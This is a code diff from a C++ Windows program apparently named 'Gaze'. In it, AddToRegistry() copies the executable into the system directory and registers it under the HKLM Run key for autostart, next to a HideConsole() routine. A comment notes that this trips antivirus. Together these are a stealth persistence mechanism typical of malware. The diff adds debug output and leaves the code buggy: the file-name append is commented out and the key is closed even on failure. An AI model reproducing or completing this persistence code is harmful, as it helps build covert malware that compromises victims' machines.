@@ -160,6 +160,7 @@ void Utilities::HideConsole()
 }
 
 // AddToRegistry() : Add this program to the registry (Will trigger most anti-virus)
+// Currently not working properly and triggering a windoes error 5 "access denied"
 bool Utilities::AddToRegistry()
 {
 	// Note MAX_PATH define in minwindef.h (part of the includes in the Utilities.h)
@@ -171,22 +172,32 @@ bool Utilities::AddToRegistry()
 
 	// Get the program path and file name
 	GetModuleFileName(module_handle, program_path, sizeof(program_path));
-
 	// Get system directory
 	GetSystemDirectory(system_path, sizeof(system_path));
-
 	// Append new file name to system_path
-	strcat_s(system_path, "\\Gaze.exe");
+	// strcat_s(system_path, "\\Gaze.exe");
 
 	if (!CopyFile(program_path, system_path, false))
+	{
+		cout << GetLastError() << endl << program_path << endl << system_path << endl;
 		return false; // if failed to copy to new location
-	
+	}
+
 	// Create key and assign it to registry 
 	HKEY key;
-	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-		          0, KEY_SET_VALUE, &key);
-	RegSetValueEx(key, "GAZE_REG", 0, REG_SZ, (const unsigned char*)system_path, sizeof(system_path));
+	LONG regOpn = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &key);
 
+	if (regOpn == ERROR_SUCCESS)
+	{
+		cout << "Successfully opened the registery" << endl;
+		RegSetValueEx(key, "GAZE_REG", 0, REG_SZ, (const unsigned char*)system_path, sizeof(system_path));
+	}
+	else
+	{
+		cout << "Failed to open the registery!" << endl;
+	}
+
+	RegCloseKey(key);
 	return true;
 }
 
